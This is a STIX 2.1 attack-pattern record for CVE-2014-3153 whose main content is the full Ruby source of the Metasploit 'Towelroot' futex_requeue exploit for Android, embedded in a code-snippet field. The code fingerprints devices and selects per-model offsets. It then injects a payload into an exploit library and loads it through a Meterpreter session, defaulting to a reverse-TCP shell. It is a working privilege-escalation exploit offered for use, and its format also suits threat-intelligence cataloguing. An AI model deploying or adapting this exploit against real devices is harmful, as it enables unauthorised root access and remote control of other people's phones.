{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3bdadacc-f446-47cb-ba39-d7f647081aa2",
    "created": "2024-08-14T16:35:05.926596Z",
    "modified": "2024-08-14T16:35:05.926601Z",
    "name": "\"Android Towelroot Futex Requeue Kernel Exploit\"",
    "description": " This module exploits a bug in futex_requeue in the Linux kernel, using similar techniques employed by the towelroot exploit. Any Android device with a kernel built before June 2014 is likely to be vulnerable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/local/futex_requeue.rb",
            "external_id": "futex_requeue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3153"
        },
        {
            "source_name": "reference",
            "url": "http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.nativeflow.com/the-futex-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Common\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => \"Android 'Towelroot' Futex Requeue Kernel Exploit\",\n          'Description' => %q{\n            This module exploits a bug in futex_requeue in the Linux kernel, using\n            similar techniques employed by the towelroot exploit. Any Android device\n            with a kernel built before June 2014 is likely to be vulnerable.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Pinkie Pie', # discovery\n            'geohot',     # towelroot\n            'timwr'       # metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2014-3153' ],\n            [ 'URL', 'http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/' ],\n            [ 'URL', 'http://blog.nativeflow.com/the-futex-vulnerability' ],\n          ],\n          'DisclosureDate' => '2014-05-03',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Platform' => [ \"android\", \"linux\" ],\n          'Payload' => { 'Space' => 2048, },\n          'DefaultOptions' => {\n            'WfsDelay' => 300,\n            'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp',\n          },\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [],\n            'Reliability' => [],\n            'AKA' => ['towelroot'] },\n          'DefaultTarget' => 0,\n          'Targets' => [\n            # Automatic targetting via getprop ro.build.model\n            ['Automatic Targeting', { 'auto' => true }],\n\n            # This is the default setting, Nexus 4, 5, 7, etc\n            [\n              'Default',\n              {\n                'new_samsung' => false,\n                'iovstack' => 2,\n                'offset' => 0,\n                'force_remove' => false,\n              }\n            ],\n\n            # Samsung devices, S3, S4, S5, etc\n            [\n              'New Samsung',\n              {\n                'new_samsung' => true,\n                'iovstack' => 2,\n                'offset' => 7380,\n                'force_remove' => true,\n              }\n            ],\n\n            # Older Samsung devices, e.g the Note 2\n            [\n              'Old Samsung',\n              {\n                'new_samsung' => false,\n                'iovstack' => 1,\n                'offset' => 0,\n                'force_remove' => true,\n              }\n            ],\n\n            # Samsung Galaxy Grand, etc\n            [\n              'Samsung Grand',\n              {\n                'new_samsung' => false,\n                'iovstack' => 5,\n                'offset' => 0,\n                'force_remove' => true,\n              }\n            ],\n          ],\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                core_loadlib\n                stdapi_fs_delete_file\n                stdapi_fs_getwd\n              ]\n            }\n          },\n        }\n      )\n    )\n  end\n\n  def check\n    os = cmd_exec(\"getprop ro.build.version.release\")\n    unless Rex::Version.new(os) < Rex::Version.new('4.5.0')\n      vprint_error \"Android version #{os} does not appear to be vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Android version #{os} appears to be vulnerable\"\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if target['auto']\n      product = cmd_exec(\"getprop ro.build.product\")\n      fingerprint = cmd_exec(\"getprop ro.build.fingerprint\")\n      print_status(\"Found device: #{product}\")\n      print_status(\"Fingerprint: #{fingerprint}\")\n\n      if [\n        \"mako\",\n        \"m7\",\n        \"hammerhead\",\n        \"grouper\",\n        \"Y530-U00\",\n        \"G6-U10\",\n        \"g2\",\n        \"w7n\",\n        \"D2303\",\n        \"cancro\",\n      ].include? product\n        my_target = targets[1] # Default\n      elsif [\n        \"klte\", # Samsung Galaxy S5\n        \"jflte\", # Samsung Galaxy S4\n        \"d2vzw\" # Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)\n      ].include? product\n        my_target = targets[2] # New Samsung\n      elsif [\n        \"t03g\",\n        \"m0\",\n      ].include? product\n        my_target = targets[3] # Old Samsung\n      elsif [\n        \"baffinlite\",\n        \"Vodafone_785\",\n      ].include? product\n        my_target = targets[4] # Samsung Grand\n      else\n        print_status(\"Could not automatically target #{product}\")\n        my_target = targets[1] # Default\n      end\n    else\n      my_target = target\n    end\n\n    print_status(\"Using target: #{my_target.name}\")\n\n    local_file = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2014-3153.so\")\n    exploit_data = File.read(local_file, mode: 'rb')\n\n    # Substitute the exploit shellcode with our own\n    space = payload_space\n    payload_encoded = payload.encoded\n    exploit_data.gsub!(\"\\x90\" * 4 + \"\\x00\" * (space - 4), payload_encoded + \"\\x90\" * (payload_encoded.length - space))\n\n    # Apply the target config\n    offsets = my_target.opts\n    config_buf = [\n      offsets['new_samsung'] ? -1 : 0,\n      offsets['iovstack'].to_i,\n      offsets['offset'].to_i,\n      offsets['force_remove'] ? -1 : 0,\n    ].pack('I4')\n    exploit_data.gsub!(\"c0nfig\" + \"\\x00\" * 10, config_buf)\n\n    workingdir = session.fs.dir.getwd\n    remote_file = \"#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}\"\n    write_file(remote_file, exploit_data)\n\n    print_status(\"Loading exploit library #{remote_file}\")\n    session.core.load_library(\n      'LibraryFilePath' => local_file,\n      'TargetFilePath' => remote_file,\n      'UploadLibrary' => false,\n      'Extension' => false,\n      'SaveToDisk' => false\n    )\n    print_status(\"Loaded library #{remote_file}, deleting\")\n    session.fs.file.rm(remote_file)\n    print_status(\"Waiting #{datastore['WfsDelay']} seconds for payload\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-03",
    "x_mitre_platforms": [
        "[ \"android\", \"linux\" ]"
    ]
}